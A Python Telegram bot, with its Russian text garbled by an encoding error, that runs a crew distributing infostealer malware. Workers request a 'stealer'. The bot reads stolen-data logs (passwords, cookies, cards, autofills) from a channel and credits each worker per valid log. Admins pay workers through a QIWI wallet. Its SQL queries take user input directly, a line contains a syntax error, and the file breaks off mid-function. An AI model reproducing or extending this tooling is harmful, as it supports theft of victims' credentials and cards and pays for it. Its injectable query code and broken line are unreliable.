# -*- coding: utf8 -*-
import config
import telebot
import sqlite3
import string
import random
import SimpleQIWI
from SimpleQIWI import *
from telebot import types
import datetime
from datetime import *

buttons_start = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
profile = types.KeyboardButton("üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å")
settings = types.KeyboardButton("‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
request = types.KeyboardButton("ü¶† –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Å—Ç–∏–ª–ª–µ—Ä")
buttons_start.row(profile, settings)
buttons_start.row(request)

buttoninline_setting = types.InlineKeyboardMarkup()
chatlink = types.InlineKeyboardButton(text='üíå –ß–∞—Ç –≤–æ—Ä–∫–µ—Ä–æ–≤', url=config.chatlink)
profitlink = types.InlineKeyboardButton(text='üíó –í—ã–ø–ª–∞—Ç—ã', url=config.profitlink)
manuallink = types.InlineKeyboardButton(text='üìö –ú–∞–Ω—É–∞–ª—ã', url=config.manuallink)
otstuklink = types.InlineKeyboardButton(text='üõ† –û—Ç—Å—Ç—É–∫', url=config.otstuklink)
rules = types.InlineKeyboardButton(text='üìú –ü—Ä–∞–≤–∏–ª–∞', callback_data='rules')
buttoninline_setting.row(chatlink, profitlink)
buttoninline_setting.row(manuallink, otstuklink)
buttoninline_setting.row(rules)

paymantagree = types.InlineKeyboardMarkup()
paymentsuccess = types.InlineKeyboardButton(text='–í—ã–ø–ª–∞—á–µ–Ω–æ', callback_data='paymentsuccess')
paymantagree.row(paymentsuccess)

buttoninline = types.InlineKeyboardMarkup()
changepayment = types.InlineKeyboardButton(text='üí≥ –ò–∑–º–µ–Ω–∏—Ç—å —Å–ø–æ—Å–æ–± –≤—ã–≤–æ–¥–∞', callback_data='changepayment')
withd = types.InlineKeyboardButton(text='ü§ë –í—ã–≤–µ—Å—Ç–∏', callback_data='withd')
changetag = types.InlineKeyboardButton(text='ü•Ω –ò–∑–º–µ–Ω–∏—Ç—å –¢—ç–≥', callback_data='changetag')
changelogin = types.InlineKeyboardButton(text='üíæ –ò–∑–º–µ–Ω–∏—Ç—å –ª–æ–≥–∏–Ω', callback_data='changelogin')
delinfo = types.InlineKeyboardButton(text='üóë –û—á–∏—Å—Ç–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É', callback_data='delinfo')
buttoninline.row(changepayment)
buttoninline.row(changetag, changelogin)
buttoninline.row(withd)
buttoninline.row(delinfo)

buttoninline_del = types.InlineKeyboardMarkup()
agreedel = types.InlineKeyboardButton(text='–Ø —É–≤–µ—Ä–µ–Ω', callback_data='agreedel')
declinedel = types.InlineKeyboardButton(text='–û—Ç–º–µ–Ω–∞', callback_data='declinedel')
buttoninline_del.row(agreedel, declinedel)

bot = telebot.TeleBot(config.token, parse_mode=None)
print('–ë–æ—Ç –≤–∫–ª—é—á–µ–Ω! '+str(datetime.now()))

api = QApi(token=config.qiwitoken, phone=config.qiwiphone)
print('Qiwi –ü–æ–¥–∫–ª—é—á–µ–Ω–æ! '+str(datetime.now()))

db = sqlite3.connect('E:/collectorteam/database.db', check_same_thread=False)
sql = db.cursor()
print('–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∞! '+str(datetime.now()))

sql.execute("""CREATE TABLE IF NOT EXISTS users (
	id INT PRIMARY KEY,
	login TEXT,
	tag TEXT,
	fname TEXT,
	balance INT,
	allprofit INT,
	alllogs INT,
	datereg TEXT,
	payment TEXT,
	status INT
)""")

@bot.message_handler(commands=['start'])
def send_welcome(message):
	try:
		sql = db.cursor()
		sql.execute(f"SELECT id FROM users WHERE id = 'message.chat.id'")
		if sql.fetchone() is None:
			letters = string.ascii_uppercase + string.digits
			rand_string = ''.join(random.choice(letters) for i in range(10))
			dt_now = str(datetime.today().strftime('%d.%m.%Y'))
			sql.execute(f"INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (message.chat.id, message.from_user.username, rand_string, message.from_user.first_name, 0, 0, 0, dt_now, '–¢—É—Ç –Ω–∏—á–µ–≥–æ –Ω–µ—Ç :(', 0))
			db.commit()
			bot.send_sticker(message.chat.id,'CAACAgEAAxkBAAEBbzVgxcr_bAyEQKGyiMbfd-OoaZV4GAACIwkAAuN4BAABn1mg9roZ0DkfBA', reply_markup=buttons_start)
			bot.send_message(message.chat.id,'–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –∫–æ–º–∞–Ω–¥—É https://t.me/kittyspig <b>'+config.team+'</b>!\n–ò—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –≤ –±–æ—Ç–µ.', parse_mode='HTML', reply_markup=buttons_start)
	except:
		pass
@bot.message_handler(commands=['payoff'])
def send_payoff(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			workeridd = message.text[message.text.find(' '):]
			bot.send_message(int(workeridd), '<b>ü•≥ –í—ã–ø–ª–∞—Ç—É –æ—Ç–ø—Ä–∞–≤–∏–ª–∏!\n–°–ø–∞—Å–∏–±–æ —á—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—à—å –∏–º–µ–Ω–Ω–æ —Å –Ω–∞–º–∏ https://t.me/kittyspig.</b>', parse_mode='HTML')
			bot.send_message(message.chat.id,'–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤–æ—Ä–∫–µ—Ä—É!')
		else:
			pass
	except:
		pass
@bot.channel_post_handler(content_types=['text','photo','audio','video','document'])
def posts_from_channels(message):
	if True:
		messtext = str(message.text).split('\n')
		first_text = messtext[0].split()
		print(first_text)
		if first_text[0] == '_________________________' and str(message.chat.id) == config.otstuklinkid:
			autofills = messtext[10].split(' ')
			passwords = messtext[11].split(' ')
			cookies = messtext[12].split(' ')
			cards = messtext[13].split(' ')
			print('Pass: '+passwords[2]+'\nCookies: '+cookies[2])
			if int(passwords[2]) >= 10 and int(cookies[2]) >= 300:
				kogoLog = messtext[5].split(' ')
				kogoLog = kogoLog[2]
				kogoLog = str(kogoLog).replace("@", "")
				print(kogoLog)
				sql.execute(f"UPDATE users SET balance=balance+'{config.price}' WHERE login='{kogoLog}'")
				sql.execute(f"UPDATE users SET allprofit=allprofit+'{config.price}' WHERE login ='{kogoLog}'")
				sql.execute(f"UPDATE users SET alllogs=alllogs+1 WHERE login='{kogoLog}'")
				db.commit()
				sql.execute(f"SELECT balance FROM users WHERE login='{kogoLog}'")
				balancework = sql.fetchall()
				sql.execute(f"SELECT id FROM users WHERE login='{kogoLog}'")
				workerid = sql.fetchall()
				bot.send_message(int(workerid[0][0]),'<b>üíû –ü—Ä–∏–ª–µ—Ç–µ–ª –≤–∞–ª–∏–¥–Ω—ã–π –õ–æ–≥!\nPasswords: '+str(passwords[2])+'\nCookies: '+str(cookies[2])+'\n–ë–∞–ª–∞–Ω—Å: '+str(balancework[0][0])+' RUB</b>', parse_mode='HTML')
@bot.message_handler(commands=['seestat'])
def send_seestat(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				worker = message.text[message.text.find(' '):]
				sql.execute(f"SELECT login FROM users WHERE id='{int(worker)}'")
				profilelogin = sql.fetchall()
				sql.execute(f"SELECT tag FROM users WHERE id='{int(worker)}'")
				tagprofile = sql.fetchall()
				sql.execute(f"SELECT balance FROM users WHERE id='{int(worker)}'")
				balanceprofile = sql.fetchall()
				sql.execute(f"SELECT allprofit FROM users WHERE id='{int(worker)}'")
				allprofiteprofile = sql.fetchall()
				sql.execute(f"SELECT datereg FROM users WHERE id='{int(worker)}'")
				dateregprofile = sql.fetchall()
				sql.execute(f"SELECT fname FROM users WHERE id='{int(worker)}'")
				fnameprofile = sql.fetchall()
				sql.execute(f"SELECT payment FROM users WHERE id='{int(worker)}'")
				paymentprofile = sql.fetchall()
				sql.execute(f"SELECT alllogs FROM users WHERE id='{int(worker)}'")
				alllogs = sql.fetchall()
				bot.send_message(message.chat.id,'*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['qiwibalance'])
def send_qiwibalance(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				balance = api.balance
				bot.send_message(message.chat.id,'ü•ù –ë–∞–ª–∞–Ω—Å QIWI –∫–æ—à–µ–ª—å–∫–∞: *'+str(balance[0])+' RUB*', parse_mode='Markdown')
			except:
				pass
		else:
			pass
	except:
		pass
@bot.message_handler(commands=['advert'])
def send_advert(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			textmessage = message.text[message.text.find(' '):]
			sql.execute(f"SELECT * FROM users")
			records = sql.fetchall()
			amountsend = 0
			amounterror = 0
			for row in records:
				try:
					bot.send_message(row[0], textmessage, parse_mode='HTML')
					amountsend = amountsend+1
				except:
					amounterror = amounterror+1
			bot.send_message(message.chat.id,'‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n–°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—É—á–∏–ª–æ: <b>'+str(amountsend)+' —é–∑–µ—Ä–∞</b>\n–ù–µ –ø–æ–ª—É—á–∏–ª–æ: <b>'+str(amounterror)+' —é–∑–µ—Ä–∞</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(commands=['setstatus'])
def send_setstatus(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				idstatus = message.text[message.text.find(':'):]
				idstatus = idstatus.replace(':','')
				sql.execute(f"UPDATE users SET status={idstatus} WHERE id={iduser}")
				db.commit()
				bot.send_message(message.chat.id,'–°—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω!')
				if int(idstatus) == 0:
					stat = '‚õè –í–æ—Ä–∫–µ—Ä'
				elif int(idstatus) == 1:
					stat = 'üî¥ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
				elif int(idstatus) == 2:
					stat = 'üï∫ –°–∞–ø–ø–æ—Ä—Ç'
				elif int(idstatus) == 3:
					stat = '‚õîÔ∏è –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
				bot.send_message(int(iduser),'<b>‚ö†Ô∏è –í–∞—à —Å—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω—ë–Ω! ‚ö†Ô∏è</b>\n\n–í–∞—à –Ω–æ–≤—ã–π —Å—Ç–∞—Ç—É—Å: <b>'+stat+'</b>', parse_mode='HTML')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['discard'])
def send_sendmessage(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				worker = message.text[message.text.find(' '):]
				worker = worker.rpartition(':')[0]  
				amount = message.text[message.text.find(':'):]
				amount = amount.replace(':','')
				sql.execute(f"SELECT balance FROM users WHERE id='{worker}'")
				beforebalance = sql.fetchall()[0][0]
				afterbalance = int(beforebalance)-int(amount)
				sql.execute(f"UPDATE users SET balance={afterbalance} WHERE id={worker}")
				db.commit()
				afterbalance = int(beforebalance)-int(amount)
				bot.send_message(message.chat.id,'üí≥ –£—Å–ø–µ—à–Ω–æ–µ —Å–ø–∏—Å–∞–Ω–∏–µ.\n–ë–∞–ª–∞–Ω—Å –¥–æ *'+str(beforebalance)+' RUB*, –ø–æ—Å–ª–µ *'+str(afterbalance)+' RUB*', parse_mode='Markdown')
				bot.send_message(int(worker),'‚ùå –£ –≤–∞—Å —Å –±–∞–ª–∞–Ω—Å–∞ —Å–ø–∏—Å–∞–ª–∏ *'+amount+' RUB*. –í–∞—à –±–∞–ª–∞–Ω—Å: *'+str(afterbalance)+' RUB*', parse_mode='Markdown')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['sendmessage'])
def send_sendmessage(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				textmessage = message.text[message.text.find(':'):]
				textmessage = textmessage.replace(':','')
				bot.send_message(int(iduser),textmessage, parse_mode='HTML')
				bot.send_message(message.chat.id,'–°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['qiwisendmoney'])
def send_qiwibalance(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				wherepayment = message.text[message.text.find(' '):]
				wherepayment = wherepayment.rpartition(':')[0]  
				amount = message.text[message.text.find(':'):]
				amount = amount.replace(':','')
				bot.send_message(message.chat.id,'<b>‚ôªÔ∏è –û—Ç–ø—Ä–∞–≤–ª—è—é –≤—ã–ø–ª–∞—Ç—É..</b>\n\nüßë‚Äçüíª –ü–æ–ª—É—á–∞—Ç–µ–ª—å: <b>'+wherepayment+'</b>\nüí∏ –°—É–º–º–∞: <b>'+amount+' RUB</b>\n‚õà –ö–æ–º–µ–Ω—Ç–∞—Ä–∏–π: <b>'++'</b>', parse_mode='HTML')
				api.pay(account=wherepayment, amount=amount, comment=config.team)
				bot.send_message(message.chat.id,'–í—ã–ø–ª–∞—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\n\n/payoff [ID WORKER]')
			except:
				bot.send_message(message.chat.id,'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ!\n–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å - /qiwibalance')
	except:
		pass
@bot.message_handler(commands=['admin'])
def send_admin(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			bot.send_message(message.chat.id,'<b>üòè Admin-Panel\n\n/discard [ID]:[AMOUNT] - —Å–ø–∏—Å–∞—Ç—å –¥–µ–Ω—å–≥–∏ —Å –±–∞–ª–∏–∫–∞ —É –≤–æ—Ä–∫–µ—Ä–∞\n/seestat [ID] - –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –≤–æ—Ä–∫–µ—Ä–∞\n/advert [TEXT] (—Ç–µ–≥–∏: https://telegra.ph/HTML-Tags-06-26)\n/sendmessage [ID WORKER]:[TEXT] - –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤–æ—Ä–∫–µ—Ä–∫—É (—Ç–µ–≥–∏: https://telegra.ph/HTML-Tags-06-26)\n/setstatus [ID WORKER]:[ID STATUS]- –ò–∑–º–µ–Ω–∏—Ç—å —Å—Ç–∞—Ç—É—Å —é–∑–µ—Ä–∞ (–∏–¥ —Å—Ç–∞—Ç—É—Å–æ–≤: 0 - –≤–æ—Ä–∫–µ—Ä, 1 - –ê–¥–º–∏–Ω, 2 - –°–∞–ø–ø–æ—Ä—Ç, 3 - –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω)\n/qiwibalance - –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –±–∞–ª–∞–Ω—Å –∫–∏–≤–∏ –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–ø–ª–∞—Ç\n/qiwisendmoney [QIWI WORKER]:[AMOUNT] - –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–µ–Ω—å–≥–∏ –Ω–∞ –∫–æ—à–µ–ª–µ–∫ –≤–æ—Ä–∫–µ—Ä–∞\n/payoff [ID WORKER] - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–æ—Ä–∫–µ—Ä—É –æ–± –≤—ã—Å–ª–∞–Ω–Ω–æ–π –≤—ã–ø–ª–∞—Ç–µ</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(content_types=['text'])
def message(message):
	if message.text == 'üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å':
		sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
		profilelogin = sql.fetchall()
		sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
		tagprofile = sql.fetchall()
		sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
		balanceprofile = sql.fetchall()
		sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
		allprofiteprofile = sql.fetchall()
		sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
		dateregprofile = sql.fetchall()
		sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
		fnameprofile = sql.fetchall()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
		alllogs = sql.fetchall()
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 0:
			statusprofile = '–í–æ—Ä–∫–µ—Ä'
		elif st == 1:
			statusprofile = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
		elif st == 2:
			statusprofile = '–°–∞–ø–ø–æ—Ä—Ç'
		elif st == 3:
			statusprofile = '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
		bot.send_message(message.chat.id,'üëÆ‚Äç‚ôÇÔ∏è –° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, *'+str(fnameprofile[0][0])+'* \n\n*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüë§ –°—Ç–∞—Ç—É—Å: *'+statusprofile+'*\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
	elif message.text == '‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è':
		bot.send_message(message.chat.id,'<b>‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</b>', parse_mode='HTML', reply_markup=buttoninline_setting)
	elif message.text == 'ü¶† –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Å—Ç–∏–ª–ª–µ—Ä':
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 3:
			bot.send_message(message.chat.id,'‚ö†Ô∏è <b>–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω</b> ‚ö†Ô∏è', parse_mode='HTML')
		else:
			try:
				bot.send_message(message.chat.id,'üß† –ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏. –û–∂–∏–¥–∞–π—Ç–µ —Å –≤–∞–º–∏ —Å–≤—è–∂—É—Ç—Å—è.')
				sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
				tagworkerr = sql.fetchall()[0][0]
				bot.send_message(config.amschatid,'<b>–≠–π, —Ö–≤–∞—Ç–∏—Ç –æ—Ç–¥—ã—Ö–∞—Ç—å üèñ\n–ù—É–∂–µ–Ω —Å—Ç–∏–ª–ª–µ—Ä!</b>\n\nüìå –¢—ç–≥: #'+str(tagworkerr)+'\nüÜî ID: <b>'+str(message.chat.id)+'</b>\nüßë‚Äçüíª –í–æ—Ä–∫–µ—Ä: @'+str(message.from_user.username)+' / '+str(message.chat.id), parse_mode='HTML')
			except:
				pass
def changetagdef(message):
	newtag = message.text
	if len(newtag) > 10:
		bot.send_message(message.chat.id,'*üôÖ‚Äç‚ôÄÔ∏è –í—ã –≤–≤–µ–ª–∏ —Ç—ç–≥ –±–æ–ª—å—à–µ 10 —Å–∏–º–≤–æ–ª–æ–≤. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.*', parse_mode='Markdown')
		return
	else:
		try:
			sql.execute(f"UPDATE users SET tag='{newtag}' WHERE id='{message.chat.id}'")
			db.commit()
			bot.send_message(message.chat.id,'üéâ')
			sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '–í–æ—Ä–∫–µ—Ä'
			elif st == 1:
				statusprofile = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
			elif st == 2:
				statusprofile = '–°–∞–ø–ø–æ—Ä—Ç'
			elif st == 3:
				statusprofile = '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
			bot.send_message(message.chat.id,'üëÆ‚Äç‚ôÇÔ∏è –° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, *'+str(fnameprofile[0][0])+'* \n\n*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüë§ –°—Ç–∞—Ç—É—Å: *'+statusprofile+'*\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
			pass
def changepaymentdef(message):
	paymentchange = message.text
	try:
		sql.execute(f"UPDATE users SET payment='{paymentchange}' WHERE id='{message.chat.id}'")
		db.commit()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		bot.send_message(message.chat.id,'üéâ')
		sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
		profilelogin = sql.fetchall()
		sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
		tagprofile = sql.fetchall()
		sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
		balanceprofile = sql.fetchall()
		sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
		allprofiteprofile = sql.fetchall()
		sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
		dateregprofile = sql.fetchall()
		sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
		fnameprofile = sql.fetchall()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
		alllogs = sql.fetchall()
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 0:
			statusprofile = '–í–æ—Ä–∫–µ—Ä'
		elif st == 1:
			statusprofile = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
		elif st == 2:
			statusprofile = '–°–∞–ø–ø–æ—Ä—Ç'
		elif st == 3:
			statusprofile = '–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'
		bot.send_message(message.chat.id,'üëÆ‚Äç‚ôÇÔ∏è –° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, *'+str(fnameprofile[0][0])+'* \n\n*üßë‚Äçüíª –ü—Ä–æ—Ñ–∏–ª—å*\n\nüìå –í–∞—à —Ç—ç–≥: #'+str(tagprofile[0][0])+'\nüíæ –õ–æ–≥–∏–Ω –≤ –ë–î: *@'+str(profilelogin[0][0])+'*\nüìâ –°—Ç–∞–≤–∫–∞ –∑–∞ –ª–æ–≥: *'+str(config.price)+' RUB*\n\nüí∏ –ë–∞–ª–∞–Ω—Å: *'+str(balanceprofile[0][0])+' RUB*\nüìä –í—Å–µ–≥–æ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ: *'+str(allprofiteprofile[0][0])+' RUB*\nüíâ –í—Å–µ–≥–æ –ª–æ–≥–æ–≤: *'+str(alllogs[0][0])+'*\nüí∞ –ö–æ—à–µ–ª–µ–∫ –¥–ª—è –≤—ã–ø–ª–∞—Ç: *'+str(paymentprofile[0][0])+'*\n\nüë§ –°—Ç–∞—Ç—É—Å: *'+statusprofile+'*\nüìÜ –¢—ã —Å –Ω–∞–º–∏ —Å: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
	except:
		pass
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	if call.data == 'changelogin':
		try:
			sql.execute(f"UPDATE users SET login='{call.message.chat.username}' WHERE id={call.message.chat.id}")
			db.commit()
			bot.send_message(call.message.chat.id, '–í–∞—à –ª–æ–≥–∏–Ω —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω.')
		except:
			pass
	if call.data == 'declinedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		try:
			sql.execute(f"SELECT login FROM users WHERE id='{call.message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{call.message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{call.message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{call.message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{call.message.chat.id}'")
